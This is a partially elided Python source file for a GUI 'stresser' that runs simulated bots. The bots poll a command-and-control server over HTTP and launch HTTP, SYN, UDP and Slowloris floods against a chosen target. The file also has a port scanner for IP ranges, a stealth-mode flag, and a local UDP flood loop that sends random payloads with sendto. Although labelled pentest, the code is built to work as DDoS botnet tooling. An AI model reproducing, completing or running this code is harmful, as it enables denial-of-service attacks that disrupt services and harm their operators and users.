# simplified_stresser_2.py (With Enhanced Bot Simulation, Delay, Improved UDP Flood, Integrated Scanner Class, and Validation - Fixed - With More Fallbacks)
...
ACTIVE_BOTS = {}
PACKETS_SENT = 0
PACKETS_SENT_LOCK = threading.Lock() # Lock for thread-safe packet counting
FAILED_PACKETS = 0
FAILED_PACKETS_LOCK = threading.Lock() # Lock for thread-safe failed packet counting
STEALTH_MODE = False
RATE_LIMIT = 0.1
OPEN_PORTS = []
...
# --- Integrated Scanner Class (Fixed Socket Usage) ---
class Scanner:
    COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
    def scan_target(self, ip, ports_to_scan, result_list, stop_event):
        """Scans a single IP for specified ports."""
    ...
    def isPortOpen(self, ip, port):
        ...
        try:
            ...
            # print(f"[SCAN DEBUG] Timeout connecting to {ip}:{port}") # Optional debug
            pass # Port likely closed or filtered
        except ConnectionRefusedError:
            # print(f"[SCAN DEBUG] Connection refused by {ip}:{port}") # Optional debug
            pass # Port closed
        except socket.gaierror as ge:
            print(f"[SCAN ERROR] Cannot resolve hostname/IP {ip}: {ge}")
        except OSError as oe: # Catch other OS-level socket errors
    ...
    def get_service_name(self, port):
        """Get a basic service name for a port."""
        services = {
    ...
    def getIpAddressesFromRange(self, start, end):
        try:
            ...
            if not start_packed or not end_packed:
...
class SimplifiedStresserGUI:
    ...
    def __init__(self, root):
        ...
        self.running_bots = set() # Track running bot IDs
        self.running_bots_lock = threading.Lock() # Lock for thread-safe access to running_bots
        self.setup_ui()
    ...
    def add_bots(self, count):
        ...
        for i in range(count):
            ...
            # Add bot to running set before starting
    ...
    def simulate_bot(self, bot_id, target, port, attack_type, bot_profile, user_agent, location):
        # global PACKETS_SENT, FAILED_PACKETS # Not needed here as we use locks
        ...
        # --- Enhanced Registration with Retries ---
        while not registration_success and registration_attempt < max_registration_attempts:
            ...
            try:
                ...
                if response.status_code == 200:
                     # Check response JSON if needed, but assuming 200 means success
                ...
                print(f"[BOT {bot_id}] Registration failed: Request timed out.")
                 ...
                 # traceback.print_exc() # Uncomment for full traceback if needed
            except Exception as e: # Catch other potential errors (e.g., JSON issues)
            ...
            if not registration_success and registration_attempt < max_registration_attempts:
                retry_delay = 5 * registration_attempt # Exponential backoff (5s, 10s, 15s)
                print(f"[BOT {bot_id}] Retrying registration in {retry_delay} seconds...")
                time.sleep(retry_delay)
            elif not registration_success:
                print(f"[BOT {bot_id}] Registration failed after {max_registration_attempts} attempts. Bot will proceed but may not receive commands.")
        ...
        while True:
            try:
                if registration_success:
                    ...
                    if response.status_code == 200:
                        resp = response.json() # Handle potential JSONDecodeError?
                        cmd = resp.get("cmd")
                        # ... process command ...
                    else:
                        print(f"[BOT {bot_id}] C2 Communication error (HTTP {response.status_code}): {response.text}")
                        time.sleep(10) # Wait before retrying
                else:
                    # If registration failed, bot can still check for global commands via class variable
                    # This part already exists, ensure it's robust
                    pass

                # ... rest of command processing ...
                if registration_success:
                    # --- Potentially add a check for C2_SERVER_RUNNING here if needed ---
                    response = requests.get(f"http://{C2_HOST}:{C2_PORT}/command/{bot_id}", timeout=5)
                    if response.status_code == 200:
                        try:
                            resp = response.json()
                        except ValueError as ve: # Handle JSON decode errors
                            print(f"[BOT {bot_id}] C2 Communication error (Invalid JSON response): {ve}")
                            print(f"[BOT {bot_id}] Response content: {response.text[:200]}...")
                            time.sleep(10)
                        ...
                        if cmd == "attack":
                            ...
                            while ATTACK_RUNNING:
                                try:
                                    ...
                                    time.sleep(delay)
                                    # --- Enhanced Attack Execution with Specific Error Handling ---
                                    if current_attack_type == "HTTP Flood":
                                        try:
                                            self.http_flood(current_target, current_port, user_agent)
                                        except socket.timeout:
                                            print(f"[BOT {bot_id}] HTTP Flood packet timed out for {current_target}:{current_port}")
                                            with FAILED_PACKETS_LOCK:
                                                global FAILED_PACKETS
                                                FAILED_PACKETS += 1
                                        except socket.gaierror as ge: # DNS resolution error
                                            print(f"[BOT {bot_id}] HTTP Flood error resolving {current_target}: {ge}")
                                            with FAILED_PACKETS_LOCK:
                                                FAILED_PACKETS += 1
                                            time.sleep(2) # Brief pause before retrying
                                        except ConnectionRefusedError:
                                            print(f"[BOT {bot_id}] HTTP Flood connection refused by {current_target}:{current_port}")
                                            with FAILED_PACKETS_LOCK:
                                                FAILED_PACKETS += 1
                                        except Exception as specific_e: # Catch other socket or unexpected errors
                                            print(f"[BOT {bot_id}] HTTP Flood unexpected error: {specific_e}")
                                            # traceback.print_exc() # Uncomment for full traceback if needed
                                            with FAILED_PACKETS_LOCK:
                                                FAILED_PACKETS += 1
                                        ...
                                        try:
                                            ...
                                            print(f"[BOT {bot_id}] SYN Flood unexpected error: {specific_e}")
                                            # traceback.print_exc() # Uncomment for full traceback if needed
                                            with FAILED_PACKETS_LOCK:
                                                FAILED_PACKETS += 1
                                        ...
                                        try:
                                            ...
                                            print(f"[BOT {bot_id}] UDP Flood error resolving {current_target}: {ge}")
                                            with FAILED_PACKETS_LOCK:
                                                FAILED_PACKETS += 1
                                            time.sleep(2)
                                        except Exception as specific_e:
                                            print(f"[BOT {bot_id}] UDP Flood unexpected error: {specific_e}")
                                            # traceback.print_exc() # Uncomment for full traceback if needed
                                            with FAILED_PACKETS_LOCK:
                                                FAILED_PACKETS += 1
                                        ...
                                        try:
                                            ...
                                            print(f"[BOT {bot_id}] Slowloris unexpected error: {specific_e}")
                                            # traceback.print_exc() # Uncomment for full traceback if needed
                                            with FAILED_PACKETS_LOCK:
                                                FAILED_PACKETS += 1

                                    # Increment packet count safely using lock
                                    with PACKETS_SENT_LOCK:
                                        global PACKETS_SENT # Declare global at the start of the block where it's modified
                                        PACKETS_SENT += 1
                                        current_packets = PACKETS_SENT
                                    # Update GUI counter periodically
                                    if current_packets % 100 == 0:
                                         try:
                                             ...
                                             pass
                                except Exception as e: # General error in the attack loop iteration
                                    # Increment failed packet count safely using lock
                                    with FAILED_PACKETS_LOCK:
                                        global FAILED_PACKETS # Declare global at the start of the block where it's modified
                                        FAILED_PACKETS += 1
                ...
                print(f"[BOT {bot_id}] C2 Communication error: Cannot connect to C2 server.")
                # Optional: Implement exponential backoff if repeated failures
                time.sleep(15) # Longer wait if connection is the issue
            except requests.exceptions.Timeout:
                print(f"[BOT {bot_id}] C2 Communication error: Request timed out.")
                time.sleep(10)
            except requests.exceptions.RequestException as e:
                 print(f"[BOT {bot_id}] C2 Communication error (Request Error): {e}")
                 # traceback.print_exc() # Uncomment for full traceback if needed
                 time.sleep(10)
            except ValueError as ve: # For JSON decode errors (response.json() can raise this)
                 print(f"[BOT {bot_id}] C2 Communication error (Invalid JSON response): {ve}")
                 print(f"[BOT {bot_id}] Response content: {response.text[:200]}...") # Log part of invalid response
                 time.sleep(10)
            except Exception as e:
                 print(f"[BOT {bot_id}] General error in C2 communication loop: {e}")
                 # traceback.print_exc() # Uncomment for full traceback if needed
                 time.sleep(15) # Wait longer for unknown errors
            finally:
                # Check for global stop command (e.g., if C2 is down)
                if hasattr(SimplifiedStresserGUI, 'pending_command') and SimplifiedStresserGUI.pending_command:
                    if SimplifiedStresserGUI.pending_command.get("cmd") == "stop":
                         print(f"[BOT {bot_id}] Attack stopped globally (C2 down or stop all).")
                         break
        # Bot finished, remove from running set
        with self.running_bots_lock:
            self.running_bots.discard(bot_id)
            self.bot_count = len(self.running_bots)
        # Update GUI bot count
        try:
             if self.root and self.root.winfo_exists():
    ...
    def http_flood(self, target, port, user_agent):
        try:
            ...
            # Specific errors are caught in simulate_bot now
            pass
    ...
    def udp_flood(self, target, port, connections=100, delay=0):
        # No global declaration needed here as modifications are inside 'with lock' blocks
        # global PACKETS_SENT, FAILED_PACKETS # <-- REMOVED
        try:
            ...
            for i in range(connections):
                try:
                    ...
                    with PACKETS_SENT_LOCK:
                        global PACKETS_SENT # OK, declared at start of modification block
                        PACKETS_SENT += 1
                    if delay > 0:
                        time.sleep(delay / 1000.0)
                except socket.error as se:
                    # Increment failed packet count safely
                    with FAILED_PACKETS_LOCK:
                        global FAILED_PACKETS # OK, declared at start of modification block
                        FAILED_PACKETS += 1
                    print(f"[BOT UDP ERROR] Socket error: {se}")
                except Exception as e:
                    # Increment failed packet count safely
                    with FAILED_PACKETS_LOCK:
                        # global FAILED_PACKETS # Not needed again in this block
                        FAILED_PACKETS += 1
                    print(f"[BOT UDP ERROR] General error: {e}")
                    # traceback.print_exc() # Uncomment for full traceback if needed
            print(f"[BOT] UDP flood finished. Sent: ~{connections}, Failed: (counted separately)")
        except socket.gaierror as ge:
    ...
    def stop_all_bots(self):
        # Check if there are any running bots before sending command
        with self.running_bots_lock:
        ...
        # Clear the pending command after a short delay
        def clear_pending():
            time.sleep(2)
            SimplifiedStresserGUI.pending_command = None
            print("[C2] Cleared pending stop command.")
        threading.Thread(target=clear_pending, daemon=True).start()

    # --- Local UDP Flood Methods (Fixed Socket Usage) ---
        ...
        try:
            ...
            for i in range(connections):
                ...
                try:
                    ...
                    sock.sendto(random._urandom(1024), (target_ip, port))
                    sock.close()
                    # Increment packet count safely for local flood
                    with PACKETS_SENT_LOCK:
                        global PACKETS_SENT # OK, declared at start of modification block
                        PACKETS_SENT += 1
                        current_packets = PACKETS_SENT
                    ...
                    # Increment failed packet count safely for local flood
                    with FAILED_PACKETS_LOCK:
                        global FAILED_PACKETS # OK, declared at start of modification block
                        FAILED_PACKETS += 1
    ...
    def start_c2_server(self):
        ...
        try:
            ...
            C2_SERVER_RUNNING = False # Ensure flag is reset on failure
            error_msg = f"Failed to start C2 Server thread: {e}"
            print(f"[C2 GUI ERROR] {error_msg}")
            # traceback.print_exc() # Uncomment for full traceback if needed
    ...
    def stop_c2_server(self):
        global C2_SERVER_RUNNING
        C2_SERVER_RUNNING = False
        self.update_status("HTTP C2 Server stopped (Flask stop not cleanly implemented).")
    ...
    def setup_pentest_tab(self):
        ...
        tk.Label(input_frame, text="Target IP/Range (e.g., 127.0.0.1 or 127.0.0.1-127.0.0.10):", bg='#0a0a1a', fg='white').pack(side=tk.LEFT)
    ...
    def scan_ports(self):
        ...
        if not target_input:
            messagebox.showerror("Error", "Enter target IP or IP range!")
            return
        ip_list = []
        if '-' in target_input:
            try:
                ...
                messagebox.showerror("Error", f"Invalid IP range format: {e}")
                return
        else:
        ...
        print(f"[SCAN] Starting scan on {len(ip_list)} target(s)")
        ...
        try:
            ...
            for ip in ip_list:
                if self.scan_stop_event.is_set():
                     print("[SCAN] Scan process stopped before starting individual scans.")
                     break
            ...
            for thread in threads:
                thread.join()
            print(f"[SCAN] All scan threads finished or stopped. Found {len(all_results)} results.")
            all_results.sort(key=lambda x: int(x[0].split('/')[0]))
        except Exception as e:
            error_message = f"General scan error: {e}"
            print(f"[SCAN ERROR - General] {e}")
            # traceback.print_exc() # Uncomment for full traceback if needed
        self.root.after(0, self._update_scan_results, all_results, error_message)

    def _update_scan_results(self, results, error_msg):
        if self.scan_button:
        ...
        success_msg = f"Scan complete. Found {len(results)} open port(s)."
        self.update_status(success_msg)
        print(f"[SCAN] {success_msg}")

    def stop_port_scan(self):
        print("[SCAN] Stop signal sent.")
